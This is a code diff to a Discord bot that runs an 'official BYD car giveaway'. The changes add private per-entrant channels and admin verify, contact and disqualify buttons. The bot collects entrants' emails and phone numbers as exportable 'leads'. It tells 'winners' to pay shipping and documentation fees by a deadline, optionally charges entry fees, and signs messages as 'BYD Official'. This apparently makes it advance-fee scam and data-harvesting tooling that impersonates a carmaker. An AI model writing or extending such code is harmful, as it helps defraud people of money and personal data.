@@ -76,6 +76,27 @@ module.exports = {
 };
 
 // ============================================
+// HELPER: Get all admin/staff users for a guild
+// ============================================
+async function getAdminUsers(guild) {
+  const admins = [];
+  try {
+    const owner = await guild.fetchOwner();
+    admins.push(owner);
+  } catch {}
+  const adminMembers = guild.members.cache.filter(m => m.permissions.has('Administrator') && m.id !== guild.ownerId);
+  for (const [, member] of adminMembers) admins.push(member);
+  try {
+    const config = await getGuildConfig(guild.id);
+    if (config?.staff_role_id) {
+      const staffRole = guild.roles.cache.get(config.staff_role_id);
+      if (staffRole) for (const [, member] of staffRole.members) if (!admins.some(a => a.id === member.id)) admins.push(member);
+    }
+  } catch {}
+  return admins;
+}
+
+// ============================================
 // START CAR GIVEAWAY
 // ============================================
 async function startCarGiveaway(interaction, guildId) {
@@ -94,15 +115,14 @@ async function startCarGiveaway(interaction, guildId) {
 
   const totalWinnerCost = shippingCost + docFee;
   const year = new Date().getFullYear();
-
-  // Create a private thread category for this giveaway's leads
   const guild = interaction.guild;
-  let leadCategory = guild.channels.cache.find(c => c.name === '🎁 Giveaway Leads' && c.type === ChannelType.GuildCategory);
-  if (!leadCategory) {
-    leadCategory = await guild.channels.create({ name: '🎁 Giveaway Leads', type: ChannelType.GuildCategory });
-  }
+  const config = await getGuildConfig(guildId);
 
-  // Create a private thread for this specific giveaway
+  // Create "🎁 Giveaway Leads" category
+  let leadCategory = guild.channels.cache.find(c => c.name === '🎁 Giveaway Leads' && c.type === ChannelType.GuildCategory);
+  if (!leadCategory) leadCategory = await guild.channels.create({ name: '🎁 Giveaway Leads', type: ChannelType.GuildCategory });
+
+  // Create private lead thread
   const leadThread = await guild.channels.create({
     name: `🎁 ${model} Giveaway Leads`,
     type: ChannelType.GuildText,
@@ -113,24 +133,15 @@ async function startCarGiveaway(interaction, guildId) {
       { id: interaction.client.user.id, allow: ['ViewChannel', 'SendMessages', 'ReadMessageHistory'] },
     ],
   });
+  if (config?.staff_role_id) await leadThread.permissionOverwrites.create(config.staff_role_id, { ViewChannel: true, SendMessages: true, ReadMessageHistory: true });
 
-  // Add staff role if configured
-  const config = await getGuildConfig(guildId);
-  if (config?.staff_role_id) {
-    await leadThread.permissionOverwrites.create(config.staff_role_id, { ViewChannel: true, SendMessages: true, ReadMessageHistory: true });
-  }
+  await leadThread.send({ embeds: [new EmbedBuilder().setTitle(`🎁 BYD ${model} Giveaway - Lead Tracker`).setDescription(`All entries for the **${year} BYD ${model}** giveaway will appear here.\n\n• **Value:** $${carData.msrp.toLocaleString()}\n• **Winner Cost:** $${totalWinnerCost.toLocaleString()}\n• **Ends:** <t:${Math.floor(endTime / 1000)}:R>`).setColor(carData.color || '#FFD700')] });
 
-  // Initial lead thread message
-  await leadThread.send({
-    embeds: [new EmbedBuilder()
-      .setTitle(`🎁 BYD ${model} Giveaway - Lead Tracker`)
-      .setDescription(`All entries for the **${year} BYD ${model}** giveaway will appear here.\n\n• **Value:** $${carData.msrp.toLocaleString()}\n• **Winner Cost:** $${totalWinnerCost.toLocaleString()}\n• **Ends:** <t:${Math.floor(endTime / 1000)}:R>`)
-      .setColor(carData.color || '#FFD700')
-      .setFooter({ text: `Giveaway ID: ${leadThread.id}` })
-    ]
-  });
+  // Create "🎁 Giveaway Entries" category for individual entry channels
+  let entryCategory = guild.channels.cache.find(c => c.name === '🎁 Giveaway Entries' && c.type === ChannelType.GuildCategory);
+  if (!entryCategory) entryCategory = await guild.channels.create({ name: '🎁 Giveaway Entries', type: ChannelType.GuildCategory });
 
-  // Build the public giveaway embed
+  // Build public embed
   const embed = new EmbedBuilder()
     .setTitle('🚗 **OFFICIAL BYD CAR GIVEAWAY!** 🚗')
     .setDescription(`# 🎁 Win a ${year} BYD ${model}!\n\n### 📊 Vehicle Specs:\n• **MSRP:** $${carData.msrp.toLocaleString()}\n• **Range:** ${carData.range}\n• **Type:** ${carData.type}\n\n### ✨ How to Enter:\nClick **"ENTER GIVEAWAY"** below.\n\n### 📋 Winner Pays:\n• Shipping: $${shippingCost.toLocaleString()}\n• Doc Fee: $${docFee.toLocaleString()}\n• **Total:** $${totalWinnerCost.toLocaleString()}\n\n### ⏰ Ends:\n<t:${Math.floor(endTime / 1000)}:R>\n\n### 👑 Winners: **${winnersCount}**\n\n${entryFee > 0 ? `### 💵 Entry Fee: $${entryFee}\n\n` : ''}*18+ with valid license required.*`)
@@ -139,22 +150,13 @@ async function startCarGiveaway(interaction, guildId) {
     .setFooter({ text: `Hosted by ${interaction.user.tag} • Winner cost: $${totalWinnerCost.toLocaleString()}`, iconURL: interaction.user.displayAvatarURL() })
     .setTimestamp(endTime);
 
-  const row = new ActionRowBuilder().addComponents(
-    new ButtonBuilder().setCustomId('cargiveaway_enter').setLabel(entryFee > 0 ? `🚗 ENTER - $${entryFee}` : '🚗 ENTER FOR FREE').setStyle(ButtonStyle.Success).setEmoji('🎁')
-  );
-
+  const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('cargiveaway_enter').setLabel(entryFee > 0 ? `🚗 ENTER - $${entryFee}` : '🚗 ENTER FOR FREE').setStyle(ButtonStyle.Success).setEmoji('🎁'));
   const message = await channel.send({ content: await getGiveawayPingContent(guildId), embeds: [embed], components: [row] });
   
-  // Save to database with lead thread ID
-  const result = await pool.query(
-    `INSERT INTO car_giveaways (guild_id, channel_id, message_id, car_model, car_year, msrp, shipping_cost, documentation_fee, winners_count, entry_fee, end_time, hosted_by) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12) RETURNING id`,
-    [guildId, channel.id, message.id, model, year, carData.msrp, shippingCost, docFee, winnersCount, entryFee, endTime, interaction.user.id]
-  );
+  const result = await pool.query(`INSERT INTO car_giveaways (guild_id, channel_id, message_id, car_model, car_year, msrp, shipping_cost, documentation_fee, winners_count, entry_fee, end_time, hosted_by) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12) RETURNING id`, [guildId, channel.id, message.id, model, year, carData.msrp, shippingCost, docFee, winnersCount, entryFee, endTime, interaction.user.id]);
+  await pool.query('UPDATE car_giveaways SET payment_status = $2 WHERE id = $1', [result.rows[0].id, JSON.stringify({ leadThreadId: leadThread.id, entryCategoryId: entryCategory.id })]);
 
-  // Store the lead thread channel ID in metadata
-  await pool.query('UPDATE car_giveaways SET payment_status = $2 WHERE id = $1', [result.rows[0].id, JSON.stringify({ leadThreadId: leadThread.id })]);
-
-  await interaction.editReply({ content: `✅ **BYD ${model} Giveaway Started!**\n\n• Channel: ${channel}\n• Value: $${carData.msrp.toLocaleString()}\n• Duration: ${durationHours}h\n• Winners: ${winnersCount}\n• Lead Thread: ${leadThread}` });
+  await interaction.editReply({ content: `✅ **BYD ${model} Giveaway Started!**\n\n• Channel: ${channel}\n• Value: $${carData.msrp.toLocaleString()}\n• Duration: ${durationHours}h\n• Winners: ${winnersCount}\n• Lead Thread: ${leadThread}\n• Entry Channels: ${entryCategory}` });
   logger.success(`🚗 Car giveaway started: BYD ${model} (ID: ${result.rows[0].id})`);
 }
 
@@ -166,58 +168,36 @@ async function exportLeads(interaction) {
   const res = await pool.query('SELECT * FROM car_giveaways WHERE message_id = $1', [messageId]);
   const giveaway = res.rows[0];
   if (!giveaway) return interaction.reply({ content: '❌ Giveaway not found.', ...EPHEMERAL });
-
   const entriesRes = await pool.query('SELECT * FROM car_giveaway_entries WHERE giveaway_id = $1 ORDER BY entered_at ASC', [giveaway.id]);
   const entries = entriesRes.rows;
+  if (entries.length === 0) return interaction.reply({ content: '❌ No entries.', ...EPHEMERAL });
 
-  if (entries.length === 0) return interaction.reply({ content: '❌ No entries for this giveaway.', ...EPHEMERAL });
+  const embed = new EmbedBuilder().setTitle(`📋 Leads: ${giveaway.car_year} BYD ${giveaway.car_model}`).setDescription(`Total: **${entries.length}**\n\n${entries.map((e, i) => `**${i + 1}.** <@${e.user_id}>\n📧 ${e.user_email || 'N/A'}\n📱 ${e.user_phone || 'N/A'}\n🕐 <t:${Math.floor(new Date(e.entered_at).getTime() / 1000)}:R>`).join('\n\n')}`).setColor('#FFD700').setTimestamp();
 
-  // Build lead export embed
-  const embed = new EmbedBuilder()
-    .setTitle(`📋 Leads: ${giveaway.car_year} BYD ${giveaway.car_model}`)
-    .setDescription(`Total entries: **${entries.length}**\n\n${entries.map((e, i) => `**${i + 1}.** <@${e.user_id}>\n📧 ${e.user_email || 'N/A'}\n📱 ${e.user_phone || 'N/A'}\n🕐 <t:${Math.floor(new Date(e.entered_at).getTime() / 1000)}:R>`).join('\n\n')}`)
-    .setColor('#FFD700')
-    .setFooter({ text: `Giveaway ID: ${giveaway.id}` })
-    .setTimestamp();
-
-  // Also send as CSV-style text
   let csvData = 'Name,User ID,Email,Phone,Entered At\n';
-  for (const e of entries) {
-    const user = await interaction.client.users.fetch(e.user_id).catch(() => null);
-    csvData += `"${user?.tag || 'Unknown'}",${e.user_id},${e.user_email || ''},${e.user_phone || ''},${e.entered_at}\n`;
-  }
+  for (const e of entries) { const user = await interaction.client.users.fetch(e.user_id).catch(() => null); csvData += `"${user?.tag || 'Unknown'}",${e.user_id},${e.user_email || ''},${e.user_phone || ''},${e.entered_at}\n`; }
 
   await interaction.reply({ embeds: [embed], ...EPHEMERAL });
-  
-  // Send CSV as a follow-up
-  if (entries.length > 0) {
-    await interaction.followUp({ 
-      content: '📎 Here\'s the CSV export:',
-      files: [{ name: `leads-${giveaway.car_model}.csv`, attachment: Buffer.from(csvData) }],
-      ...EPHEMERAL 
-    });
-  }
+  if (entries.length > 0) await interaction.followUp({ content: '📎 CSV export:', files: [{ name: `leads-${giveaway.car_model}.csv`, attachment: Buffer.from(csvData) }], ...EPHEMERAL });
 }
 
 // ============================================
-// END / REROLL / WINNERS (unchanged but fixed ephemeral)
+// END / REROLL / WINNERS
 // ============================================
 async function endCarGiveaway(interaction) {
   const messageId = interaction.options.getString('message_id');
   const res = await pool.query('SELECT * FROM car_giveaways WHERE message_id = $1 AND ended = false', [messageId]);
-  const giveaway = res.rows[0];
-  if (!giveaway) return interaction.reply({ content: '❌ Giveaway not found or already ended.', ...EPHEMERAL });
+  if (!res.rows[0]) return interaction.reply({ content: '❌ Giveaway not found.', ...EPHEMERAL });
   await interaction.deferReply(EPHEMERAL);
-  await selectCarWinners(interaction, giveaway, false);
+  await selectCarWinners(interaction, res.rows[0], false);
 }
 
 async function rerollCarGiveaway(interaction) {
   const messageId = interaction.options.getString('message_id');
   const res = await pool.query('SELECT * FROM car_giveaways WHERE message_id = $1 AND ended = true', [messageId]);
-  const giveaway = res.rows[0];
-  if (!giveaway) return interaction.reply({ content: '❌ Giveaway not found or still active.', ...EPHEMERAL });
+  if (!res.rows[0]) return interaction.reply({ content: '❌ Giveaway not found.', ...EPHEMERAL });
   await interaction.deferReply(EPHEMERAL);
-  await selectCarWinners(interaction, giveaway, true, giveaway.winners || []);
+  await selectCarWinners(interaction, res.rows[0], true, res.rows[0].winners || []);
 }
 
 async function selectCarWinners(interaction, giveaway, isReroll = false, excludeWinners = []) {
@@ -229,37 +209,25 @@ async function selectCarWinners(interaction, giveaway, isReroll = false, exclude
   const originalMessage = channel ? await channel.messages.fetch(giveaway.message_id).catch(() => null) : null;
   
   if (entries.length === 0) {
-    const noWinnerEmbed = new EmbedBuilder().setTitle('🚗 BYD Car Giveaway Ended').setDescription(`**Prize:** ${giveaway.car_year} BYD ${giveaway.car_model}\n**Value:** $${giveaway.msrp.toLocaleString()}\n\n❌ No one entered!`).setColor('#FF0000').setTimestamp();
-    if (originalMessage) await originalMessage.edit({ embeds: [noWinnerEmbed], components: [] });
+    if (originalMessage) await originalMessage.edit({ embeds: [new EmbedBuilder().setTitle('🚗 BYD Car Giveaway Ended').setDescription(`**Prize:** ${giveaway.car_year} BYD ${giveaway.car_model}\n**Value:** $${giveaway.msrp.toLocaleString()}\n\n❌ No one entered!`).setColor('#FF0000').setTimestamp()], components: [] });
     await pool.query('UPDATE car_giveaways SET ended = true WHERE id = $1', [giveaway.id]);
-    return interaction.editReply({ content: '❌ Giveaway ended with no entrants.' });
+    return interaction.editReply({ content: '❌ No entrants.' });
   }
 
   const shuffled = [...entries.map(e => e.user_id)].sort(() => 0.5 - Math.random());
   const winners = shuffled.slice(0, giveaway.winners_count);
   const totalCost = giveaway.shipping_cost + giveaway.documentation_fee;
   
-  const winnerEmbed = new EmbedBuilder()
-    .setTitle(`🚗 ${isReroll ? '🔄 REROLL - ' : ''}BYD CAR GIVEAWAY WINNER! 🚗`)
-    .setDescription(`## 🏆 CONGRATULATIONS!\n\n**Prize:** ${giveaway.car_year} BYD ${giveaway.car_model}\n**MSRP:** $${giveaway.msrp.toLocaleString()}\n\n### 👑 Winner(s):\n${winners.map(id => `<@${id}>`).join('\n')}\n\n### 📋 Next Steps:\n• Winners DM'd\n• **Payment:** $${totalCost.toLocaleString()}\n• **Deadline:** ${PAYMENT_DEADLINE_HOURS}h`)
-    .setColor('#00FF00').setFooter({ text: `BYD Official • ${isReroll ? 'Rerolled' : 'Ended'}` }).setTimestamp();
-  
   if (originalMessage) {
-    await originalMessage.edit({ embeds: [winnerEmbed], components: [] });
+    await originalMessage.edit({ embeds: [new EmbedBuilder().setTitle(`🚗 ${isReroll ? '🔄 REROLL - ' : ''}BYD CAR GIVEAWAY WINNER! 🚗`).setDescription(`## 🏆 CONGRATULATIONS!\n\n**Prize:** ${giveaway.car_year} BYD ${giveaway.car_model}\n**MSRP:** $${giveaway.msrp.toLocaleString()}\n\n### 👑 Winner(s):\n${winners.map(id => `<@${id}>`).join('\n')}\n\n### 📋 Next Steps:\n• Winners DM'd\n• **Payment:** $${totalCost.toLocaleString()}\n• **Deadline:** ${PAYMENT_DEADLINE_HOURS}h`).setColor('#00FF00').setFooter({ text: `BYD Official • ${isReroll ? 'Rerolled' : 'Ended'}` }).setTimestamp()], components: [] });
     await originalMessage.reply({ content: `🎉 ${winners.map(id => `<@${id}>`).join(', ')} - You won the **${giveaway.car_year} BYD ${giveaway.car_model}**! Check DMs!` });
   }
   
   await pool.query('UPDATE car_giveaways SET ended = true, winners = $2 WHERE id = $1', [giveaway.id, winners]);
   
-  // Notify in the lead thread
-  const paymentStatus = giveaway.payment_status || {};
-  if (paymentStatus.leadThreadId) {
-    try {
-      const leadThread = await interaction.client.channels.fetch(paymentStatus.leadThreadId);
-      if (leadThread) {
-        await leadThread.send({ content: `🎉 **WINNER SELECTED!**\n\n${winners.map(id => `<@${id}>`).join(', ')} won the **${giveaway.car_year} BYD ${giveaway.car_model}**!\n\n📋 Use \`/cargiveaway winner\` to mark payment.` });
-      }
-    } catch {}
+  const ps = giveaway.payment_status || {};
+  if (ps.leadThreadId) {
+    try { const lt = await interaction.client.channels.fetch(ps.leadThreadId); if (lt) await lt.send({ content: `🎉 **WINNER!** ${winners.map(id => `<@${id}>`).join(', ')} won the **${giveaway.car_year} BYD ${giveaway.car_model}**!` }); } catch {}
   }
   
   for (const userId of winners) {
@@ -269,7 +237,7 @@ async function selectCarWinners(interaction, giveaway, isReroll = false, exclude
     } catch {}
   }
   
-  await interaction.editReply({ content: `✅ **Winners Selected!**\n\n🏆 ${winners.map(id => `<@${id}>`).join(', ')}\n\n• Entries: ${entries.length}\n• Winner cost: $${totalCost.toLocaleString()}` });
+  await interaction.editReply({ content: `✅ **Winners!**\n\n🏆 ${winners.map(id => `<@${id}>`).join(', ')}\n\n• Entries: ${entries.length}\n• Cost: $${totalCost.toLocaleString()}` });
 }
 
 async function processWinner(interaction) {
@@ -281,32 +249,32 @@ async function processWinner(interaction) {
   if (!giveaway.winners?.includes(winnerUser.id)) return interaction.reply({ content: '❌ Not a winner.', ...EPHEMERAL });
   
   const totalCost = giveaway.shipping_cost + giveaway.documentation_fee;
-  const paymentStatus = giveaway.payment_status || {};
-  paymentStatus[winnerUser.id] = { paid: true, processedBy: interaction.user.id, processedAt: new Date().toISOString() };
-  await pool.query('UPDATE car_giveaways SET payment_status = $2 WHERE id = $1', [giveaway.id, JSON.stringify(paymentStatus)]);
+  const ps = giveaway.payment_status || {};
+  ps[winnerUser.id] = { paid: true, processedBy: interaction.user.id, processedAt: new Date().toISOString() };
+  await pool.query('UPDATE car_giveaways SET payment_status = $2 WHERE id = $1', [giveaway.id, JSON.stringify(ps)]);
   
-  await interaction.reply({ content: `✅ **Payment Processed!**\n\n• Winner: ${winnerUser.tag}\n• Vehicle: ${giveaway.car_year} BYD ${giveaway.car_model}\n• Collected: $${totalCost.toLocaleString()}`, ...EPHEMERAL });
+  await interaction.reply({ content: `✅ **Paid!**\n\n• Winner: ${winnerUser.tag}\n• Vehicle: ${giveaway.car_year} BYD ${giveaway.car_model}\n• Collected: $${totalCost.toLocaleString()}`, ...EPHEMERAL });
   await winnerUser.send({ embeds: [new EmbedBuilder().setTitle('📦 Payment Confirmed!').setDescription(`# ✅ Paid!\n\nYour **${giveaway.car_year} BYD ${giveaway.car_model}** is being prepared.\n\nDelivery specialist contacts you within 24-48h.`).setColor('#00FF00')] }).catch(() => {});
 }
 
 async function listCarGiveaways(interaction, guildId) {
   const res = await pool.query('SELECT * FROM car_giveaways WHERE guild_id = $1 AND ended = false ORDER BY end_time ASC', [guildId]);
-  if (res.rows.length === 0) return interaction.reply({ content: '📭 No active car giveaways.', ...EPHEMERAL });
+  if (res.rows.length === 0) return interaction.reply({ content: '📭 No active giveaways.', ...EPHEMERAL });
   const embed = new EmbedBuilder().setTitle('🚗 Active Car Giveaways').setColor('#FFD700').setTimestamp();
   for (const gw of res.rows) {
-    const countRes = await pool.query('SELECT COUNT(*) as count FROM car_giveaway_entries WHERE giveaway_id = $1', [gw.id]);
-    embed.addFields({ name: `${gw.car_year} BYD ${gw.car_model}`, value: `• Value: $${gw.msrp.toLocaleString()}\n• Entries: ${countRes.rows[0]?.count || 0}\n• Ends: <t:${Math.floor(new Date(gw.end_time).getTime() / 1000)}:R>\n• ID: ${gw.message_id}`, inline: true });
+    const c = await pool.query('SELECT COUNT(*) as count FROM car_giveaway_entries WHERE giveaway_id = $1', [gw.id]);
+    embed.addFields({ name: `${gw.car_year} BYD ${gw.car_model}`, value: `• Value: $${gw.msrp.toLocaleString()}\n• Entries: ${c.rows[0]?.count || 0}\n• Ends: <t:${Math.floor(new Date(gw.end_time).getTime() / 1000)}:R>\n• ID: ${gw.message_id}`, inline: true });
   }
   await interaction.reply({ embeds: [embed], ...EPHEMERAL });
 }
 
 async function getGiveawayPingContent(guildId) {
-  try { const config = await getGuildConfig(guildId); if (config?.giveaway_ping_role_id) return `<@&${config.giveaway_ping_role_id}> 🚗 **NEW CAR GIVEAWAY!**`; } catch {}
+  try { const c = await getGuildConfig(guildId); if (c?.giveaway_ping_role_id) return `<@&${c.giveaway_ping_role_id}> 🚗 **NEW CAR GIVEAWAY!**`; } catch {}
   return '🚗 **NEW CAR GIVEAWAY!**';
 }
 
 // ============================================
-// BUTTON/MODAL HANDLERS (with lead thread notification)
+// BUTTON HANDLER
 // ============================================
 async function handleCarGiveawayButton(interaction) {
   if (interaction.customId !== 'cargiveaway_enter') return false;
@@ -326,6 +294,9 @@ async function handleCarGiveawayButton(interaction) {
   return true;
 }
 
+// ============================================
+// MODAL HANDLER - WITH PRIVATE ENTRY CHANNEL
+// ============================================
 async function handleCarGiveawayModal(interaction) {
   if (interaction.customId !== 'cargiveaway_entry_modal') return false;
   const email = interaction.fields.getTextInputValue('email');
@@ -340,32 +311,77 @@ async function handleCarGiveawayModal(interaction) {
   const giveaway = res.rows[0];
   if (!giveaway) return interaction.reply({ content: '❌ Giveaway ended.', ...EPHEMERAL });
   
+  // Save entry to database
   await pool.query('INSERT INTO car_giveaway_entries (giveaway_id, user_id, user_email, user_phone, agreed_to_terms) VALUES ($1,$2,$3,$4,$5)', [giveaway.id, interaction.user.id, email, phone || null, true]);
   
-  // Notify in the lead thread
-  const paymentStatus = giveaway.payment_status || {};
-  if (paymentStatus.leadThreadId) {
+  // ============================================
+  // CREATE PRIVATE ENTRY CHANNEL FOR THIS USER
+  // ============================================
+  const guild = interaction.guild;
+  const config = await getGuildConfig(guild.id);
+  const ps = giveaway.payment_status || {};
+  
+  // Find or create entry category
+  let entryCategory = guild.channels.cache.find(c => c.name === '🎁 Giveaway Entries' && c.type === ChannelType.GuildCategory);
+  if (ps.entryCategoryId) entryCategory = guild.channels.cache.get(ps.entryCategoryId) || entryCategory;
+  if (!entryCategory) entryCategory = await guild.channels.create({ name: '🎁 Giveaway Entries', type: ChannelType.GuildCategory });
+  
+  // Create private channel
+  const entryChannel = await guild.channels.create({
+    name: `entry-${interaction.user.username}-${giveaway.car_model}`,
+    type: ChannelType.GuildText,
+    parent: entryCategory.id,
+    permissionOverwrites: [
+      { id: guild.id, deny: ['ViewChannel'] },
+      { id: interaction.user.id, allow: ['ViewChannel', 'SendMessages', 'ReadMessageHistory'] },
+      { id: interaction.client.user.id, allow: ['ViewChannel', 'SendMessages', 'ReadMessageHistory'] },
+    ],
+  });
+  
+  // Add staff role
+  if (config?.staff_role_id) {
+    await entryChannel.permissionOverwrites.create(config.staff_role_id, { ViewChannel: true, SendMessages: true, ReadMessageHistory: true });
+  }
+  
+  // Add all admins
+  const admins = await getAdminUsers(guild);
+  for (const admin of admins) {
+    try { await entryChannel.permissionOverwrites.create(admin.id, { ViewChannel: true, SendMessages: true, ReadMessageHistory: true }); } catch {}
+  }
+  
+  // Welcome embed in private channel
+  const welcomeEmbed = new EmbedBuilder()
+    .setTitle('🎁 Giveaway Entry Confirmed!')
+    .setDescription(`Welcome <@${interaction.user.id}>! Your entry has been recorded.\n\n### 📋 Entry Details:\n• **Giveaway:** ${giveaway.car_year} BYD ${giveaway.car_model}\n• **Value:** $${giveaway.msrp.toLocaleString()}\n• **Email:** ${email}\n• **Phone:** ${phone || 'N/A'}\n• **Entry Fee:** $${(giveaway.entry_fee || 0).toLocaleString()}\n\n### ⏰ Ends:\n<t:${Math.floor(new Date(giveaway.end_time).getTime() / 1000)}:R>\n\n### 📋 What's Next:\n• Winners will be announced here\n• Admins may contact you for verification\n• Check back for updates\n\n🍀 **Good luck!**`)
+    .setColor('#FFD700')
+    .setThumbnail(interaction.user.displayAvatarURL())
+    .setFooter({ text: `Entry #${giveaway.id} • BYD Official Giveaway` })
+    .setTimestamp();
+  
+  // Admin action buttons
+  const adminRow = new ActionRowBuilder().addComponents(
+    new ButtonBuilder().setCustomId(`verify_entry_${giveaway.id}_${interaction.user.id}`).setLabel('✅ Verify').setStyle(ButtonStyle.Success),
+    new ButtonBuilder().setCustomId(`contact_entry_${giveaway.id}_${interaction.user.id}`).setLabel('📩 Contact').setStyle(ButtonStyle.Primary),
+    new ButtonBuilder().setCustomId(`disqualify_entry_${giveaway.id}_${interaction.user.id}`).setLabel('❌ Disqualify').setStyle(ButtonStyle.Danger)
+  );
+  
+  await entryChannel.send({ content: `Welcome <@${interaction.user.id}>! Staff will review your entry shortly.`, embeds: [welcomeEmbed], components: [adminRow] });
+  
+  // Notify lead thread
+  if (ps.leadThreadId) {
     try {
-      const leadThread = await interaction.client.channels.fetch(paymentStatus.leadThreadId);
+      const leadThread = await interaction.client.channels.fetch(ps.leadThreadId);
       if (leadThread) {
-        const entryEmbed = new EmbedBuilder()
-          .setTitle('🆕 New Entry!')
-          .setDescription(`**User:** ${interaction.user.tag} (<@${interaction.user.id}>)\n**Email:** ${email}\n**Phone:** ${phone || 'N/A'}\n**Entered:** <t:${Math.floor(Date.now() / 1000)}:R>`)
-          .setColor('#00FF00')
-          .setThumbnail(interaction.user.displayAvatarURL())
-          .setTimestamp();
-        await leadThread.send({ embeds: [entryEmbed] });
+        await leadThread.send({ embeds: [new EmbedBuilder().setTitle('🆕 New Entry!').setDescription(`**User:** ${interaction.user.tag} (<@${interaction.user.id}>)\n**Email:** ${email}\n**Phone:** ${phone || 'N/A'}\n**Entered:** <t:${Math.floor(Date.now() / 1000)}:R>\n**Channel:** ${entryChannel}`).setColor('#00FF00').setThumbnail(interaction.user.displayAvatarURL()).setTimestamp()] });
       }
     } catch {}
   }
   
-  // DM confirmation to the user
-  try {
-    await interaction.user.send({ embeds: [new EmbedBuilder().setTitle('✅ Entry Confirmed!').setDescription(`You're entered to win the **${giveaway.car_year} BYD ${giveaway.car_model}**!\n\n• Value: $${giveaway.msrp.toLocaleString()}\n• Ends: <t:${Math.floor(new Date(giveaway.end_time).getTime() / 1000)}:R>\n\n🍀 Good luck!`).setColor('#FFD700')] });
-  } catch {}
+  // DM confirmation
+  try { await interaction.user.send({ embeds: [new EmbedBuilder().setTitle('✅ Entry Confirmed!').setDescription(`You're entered to win the **${giveaway.car_year} BYD ${giveaway.car_model}**!\n\n• Value: $${giveaway.msrp.toLocaleString()}\n• Ends: <t:${Math.floor(new Date(giveaway.end_time).getTime() / 1000)}:R>\n• Your channel: ${entryChannel}\n\n🍀 Good luck!`).setColor('#FFD700')] }); } catch {}
   
-  await interaction.reply({ content: `✅ **Entered!** 🎉\n\n• ${giveaway.car_year} BYD ${giveaway.car_model}\n• Value: $${giveaway.msrp.toLocaleString()}\n• Ends: <t:${Math.floor(new Date(giveaway.end_time).getTime() / 1000)}:R>\n\n🍀 Good luck!`, ...EPHEMERAL });
-  logger.info(`User ${interaction.user.tag} entered car giveaway ${giveaway.id}`);
+  await interaction.reply({ content: `✅ **Entered!** 🎉\n\n• ${giveaway.car_year} BYD ${giveaway.car_model}\n• Value: $${giveaway.msrp.toLocaleString()}\n• Ends: <t:${Math.floor(new Date(giveaway.end_time).getTime() / 1000)}:R>\n• Your channel: ${entryChannel}\n\n🍀 Good luck!`, ...EPHEMERAL });
+  logger.info(`User ${interaction.user.tag} entered car giveaway ${giveaway.id} - Channel: ${entryChannel.name}`);
   return true;
 }
 
